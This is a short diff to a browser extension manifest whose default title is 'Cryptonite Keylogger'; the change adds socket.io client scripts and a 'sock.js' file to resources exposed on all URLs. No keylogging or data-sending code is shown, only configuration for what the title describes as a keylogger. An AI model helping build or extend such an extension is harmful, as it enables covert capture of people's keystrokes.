@@ -17,7 +17,7 @@
     ],
     "web_accessible_resources": [{
         "matches": ["<all_urls>"],
-        "resources": ["scripts/brython.js", "scripts/brython_stdlib.js","scripts/test.js","public/test.html", "public/item.html"]
+        "resources": ["scripts/socket.io.js", "scripts/socket.io.js.map", "scripts/sock.js","scripts/brython.js", "scripts/brython_stdlib.js","scripts/test.js","public/test.html", "public/item.html"]
     }],
     "action": {
         "default_title": "Cryptonite Keylogger",
